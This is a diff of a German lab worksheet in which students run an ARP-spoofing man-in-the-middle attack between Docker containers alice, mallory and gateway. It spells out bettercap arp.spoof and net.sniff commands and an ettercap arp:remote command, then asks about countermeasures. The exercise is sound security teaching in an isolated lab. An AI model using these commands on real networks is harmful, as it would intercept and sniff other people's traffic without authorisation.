@@ -10,9 +10,6 @@
 
 ---
 
-> **Hinweis:** Die IP-Adressen werden von Docker beim Start dynamisch vergeben.
-> Die konkreten Adressen zeigt `./setup.sh` am Ende an (auch in `.lab-ips` gespeichert).
-
 ## Lernziele
 
 Nach diesem Lab kannst du...
@@ -37,20 +34,26 @@ Du arbeitest mit drei Containern. Ein **Opfer** kommuniziert regelmäßig mit ei
 
 ```
   ┌─────────────────┐       ┌──────────────────┐       ┌─────────────────┐
-  │      alice      │       │     mallory      │       │     gateway     │
-  │ <IP von alice>  │       │ <IP von mallory>   │       │ <IP von gateway>   │
+  │   lab02-alice   │       │  lab02-mallory   │       │  lab02-gateway  │
   │    (Opfer)      │       │   (Angreifer)    │       │  (Webserver)    │
   └─────────────────┘       └──────────────────┘       └─────────────────┘
 
-         Alle drei Container im selben Netz: <Subnetz – siehe setup.sh-Ausgabe>
-                       Docker Bridge (lab-net)
+         Alle drei Container im selben Netz: lab02-net (/24)
+         IPs werden beim Start vergeben – siehe setup.sh-Ausgabe
+         oder jederzeit: cat /etc/lab-info  (in jedem Container)
 ```
 
-| Container | Image | IP | Rolle |
-|---|---|---|---|
-| `alice` | `ubuntu:22.04` | `<IP von alice>` | Sendet HTTP-Anfragen an gateway |
-| `mallory` | `kalilinux/kali-rolling` | `<IP von mallory>` | Angreifer im gleichen Segment |
-| `gateway` | `alpine:latest` | `<IP von gateway>` | HTTP-Webserver (Port 80) |
+| Container | Image | Rolle |
+|---|---|---|
+| `lab02-alice` | `ubuntu:22.04` | Opfer – sendet HTTP-Anfragen an gateway |
+| `lab02-mallory` | `kalilinux/kali-rolling` | Angreifer im gleichen Segment |
+| `lab02-gateway` | `alpine:latest` | HTTP-Webserver (Port 80) |
+
+> **Hinweis:** Die IP-Adressen werden beim Start dynamisch vergeben.
+> `./setup.sh` zeigt sie am Ende an. In jedem Container steht außerdem:
+> ```bash
+> cat /etc/lab-info
+> ```
 
 ---
 
@@ -63,12 +66,20 @@ chmod +x setup.sh teardown.sh
 ./setup.sh
 ```
 
-Das Skript startet alle Container und installiert die benötigten Tools.
-Warte bis `Lab ist bereit!` erscheint.
+Das Skript startet alle Container, installiert die benötigten Tools
+und zeigt am Ende die IP-Adressen an. Warte bis `Lab ist bereit!` erscheint.
 
 ```bash
 docker ps
-# Erwartung: 3 Container (alice, gateway, mallory) mit Status "Up"
+# Erwartung: 3 Container (lab02-alice, lab02-gateway, lab02-mallory) mit Status "Up"
+```
+
+Notiere die IP-Adressen aus der Ausgabe:
+
+```
+IP alice   (Opfer):      _______________________
+IP gateway (Webserver):  _______________________
+IP mallory (Angreifer):  _______________________
 ```
 
 ---
@@ -77,13 +88,13 @@ docker ps
 
 ```bash
 # Terminal A – alice (Opfer)
-docker exec -it alice bash
+docker exec -it lab02-alice bash
 
 # Terminal B – mallory (Angreifer)
-docker exec -it mallory bash
+docker exec -it lab02-mallory bash
 
 # Terminal C – gateway (Webserver)
-docker exec -it gateway sh
+docker exec -it lab02-gateway sh
 ```
 
 ---
@@ -100,24 +111,24 @@ arp -n
 ping -c 3 <IP von gateway>
 ```
 
-Notiere die MAC-Adresse, die für `<IP von gateway>` eingetragen ist:
+Notiere die MAC-Adresse, die für gateway eingetragen ist:
 
 ```
-MAC-Adresse von <IP von gateway> (vor Angriff): _______________________________
+MAC-Adresse von gateway (vor Angriff): _______________________________
 ```
 
 > **Frage:** Zu welchem Container gehört diese MAC-Adresse?
 > Überprüfe es:
 > ```bash
-> docker exec gateway ip link show eth0
-> docker exec mallory ip link show eth0
+> docker exec lab02-gateway ip link show eth0
+> docker exec lab02-mallory ip link show eth0
 > ```
 
 ---
 
 ### Schritt 4 – HTTP-Traffic beobachten
 
-alice sendet bereits automatisch alle 5 Sekunden Anfragen ans Gateway.
+alice sendet bereits automatisch alle 2 Sekunden Anfragen ans Gateway.
 Überzeuge dich davon:
 
 ```bash
@@ -131,28 +142,43 @@ Du siehst die Antwort des Webservers. Merke dir, welche Informationen darin enth
 
 ### Schritt 5 – Angriff starten: bettercap
 
-Wechsle zu **Terminal B (mallory)**:
+Wechsle zu **Terminal B (lab02-mallory)**:
 
 ```bash
 bettercap -iface eth0
 ```
 
-In der bettercap-Konsole:
+**Wichtig:** Zuerst das Netzwerk scannen – bettercap muss alice und gateway
+kennen, bevor es den Angriff starten kann:
 
 ```
 net.probe on
+```
+
+Warte bis du siehst:
+```
+[endpoint.new] endpoint <IP alice> detected ...
+[endpoint.new] endpoint <IP gateway> detected ...
+```
+
+Zeige die gefundenen Hosts an:
+```
 net.show
 ```
 
-> **Frage:** Welche Hosts werden gefunden? Was siehst du in der Ausgabe?
+> **Frage:** Welche Hosts werden angezeigt? Welche MAC-Adressen sind sichtbar?
 
-Starte den Angriff:
+---
+
+### Schritt 6 – ARP-Spoofing aktivieren
+
+Erst wenn alice und gateway in `net.show` sichtbar sind:
 
 ```
 set arp.spoof.targets <IP von alice>
+set arp.spoof.gateway <IP von gateway>
 set arp.spoof.fullduplex true
 arp.spoof on
-
 set net.sniff.verbose true
 net.sniff on
 ```
@@ -161,18 +187,18 @@ Warte ca. 15 Sekunden.
 
 ---
 
-### Schritt 6 – Merkt alice etwas?
+### Schritt 7 – Merkt alice etwas?
 
 Öffne ein **viertes Terminal** und prüfe den ARP-Cache von alice:
 
 ```bash
-docker exec alice arp -n
+docker exec lab02-alice arp -n
 ```
 
-Notiere die MAC-Adresse, die jetzt für `<IP von gateway>` eingetragen ist:
+Notiere die MAC-Adresse, die jetzt für gateway eingetragen ist:
 
 ```
-MAC-Adresse von <IP von gateway> (nach Angriff): _______________________________
+MAC-Adresse von gateway (nach Angriff): _______________________________
 ```
 
 > **Beobachte:** Hat sich etwas verändert? Vergleiche mit deiner Notiz aus Schritt 3.
@@ -180,7 +206,7 @@ MAC-Adresse von <IP von gateway> (nach Angriff): _______________________________
 Prüfe gleichzeitig, ob alice weiterhin Antworten bekommt:
 
 ```bash
-docker exec alice curl -s http://<IP von gateway>/
+docker exec lab02-alice curl -s http://<IP von gateway>/
 ```
 
 **Was fällt auf?**
@@ -192,7 +218,7 @@ _______________________________________________
 
 ---
 
-### Schritt 7 – Traffic auf mallory beobachten
+### Schritt 8 – Traffic auf mallory beobachten
 
 Beobachte die `net.sniff`-Ausgabe in Terminal B ca. 30 Sekunden lang.
 
@@ -211,15 +237,15 @@ _______________________________________________
 Beobachte parallel die ARP-Ebene auf alice:
 
 ```bash
-# Viertes Terminal – auf alice:
-docker exec alice tcpdump -i eth0 -n arp
+# Viertes Terminal:
+docker exec lab02-alice tcpdump -i eth0 -n arp
 ```
 
 > **Frage:** Wer sendet ARP-Pakete? Was behaupten diese Pakete?
 
 ---
 
-### Schritt 8 – Angriff stoppen
+### Schritt 9 – Angriff stoppen
 
 In Terminal B (bettercap-Konsole):
 
@@ -232,7 +258,7 @@ exit
 Warte ca. 30 Sekunden. Prüfe erneut den ARP-Cache von alice:
 
 ```bash
-docker exec alice arp -n
+docker exec lab02-alice arp -n
 ```
 
 **Was beobachtest du?**
@@ -243,10 +269,10 @@ _______________________________________________
 
 ---
 
-### Schritt 9 – Wiederholung mit ettercap
+### Schritt 10 – Wiederholung mit ettercap
 
 ```bash
-# Auf mallory (Terminal B):
+# Auf lab02-mallory (Terminal B):
 ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
 ```
 
@@ -256,7 +282,7 @@ Beende ettercap mit `Ctrl+Q`.
 
 ---
 
-### Schritt 10 – Cleanup
+### Schritt 11 – Cleanup
 
 ```bash
 ./teardown.sh
@@ -279,14 +305,17 @@ Erkläre, warum alice seinen Traffic an mallory schickt – obwohl alice eigentl
 Was würde passieren, wenn diese Einstellung auf mallory nicht aktiv wäre?
 Warum ist das für den Angriff entscheidend?
 
-**F4 – Hat alice etwas bemerkt?**
+**F4 – Warum muss bettercap zuerst `net.probe on` ausführen?**
+Was passiert, wenn man `arp.spoof on` startet ohne vorher zu scannen?
+
+**F5 – Hat alice etwas bemerkt?**
 Was sagt dir das über reale Angreiferszenarien in Büro- oder Campusnetzen?
 
-**F5 – Wie nennt sich dieser Angriff?**
+**F6 – Wie nennt sich dieser Angriff?**
 Recherchiere den Fachbegriff für diese Art der Manipulation.
 Welcher übergeordnete Angriffstyp (aus lab01 bekannt) wird damit realisiert?
 
-**F6 – Schutzmaßnahmen**
+**F7 – Schutzmaßnahmen**
 Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern oder erschweren.
 Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?
 
@@ -296,13 +325,16 @@ Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?
 
 | Befehl | Beschreibung | Container |
 |---|---|---|
-| `arp -n` | ARP-Cache anzeigen | alice |
+| `cat /etc/lab-info` | IP-Übersicht anzeigen | alle |
+| `arp -n` | ARP-Cache anzeigen | lab02-alice |
 | `ip link show eth0` | MAC-Adresse anzeigen | alle |
 | `ping -c 3 <ip>` | Erreichbarkeit testen | alle |
-| `curl -s http://<IP von gateway>/` | HTTP-Anfrage senden | alice |
-| `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | alice |
-| `bettercap -iface eth0` | bettercap starten | mallory |
-| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ettercap MitM | mallory |
+| `curl -s http://<ip>/` | HTTP-Anfrage senden | lab02-alice |
+| `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | lab02-alice |
+| `bettercap -iface eth0` | bettercap starten | lab02-mallory |
+| `net.probe on` | Netz scannen (vor arp.spoof!) | bettercap |
+| `net.show` | Gefundene Hosts anzeigen | bettercap |
+| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ettercap MitM | lab02-mallory |
 | `./setup.sh` | Lab starten | Host |
 | `./teardown.sh` | Lab beenden | Host |
 | `docker exec -it <n> bash` | In Container einloggen | Host |
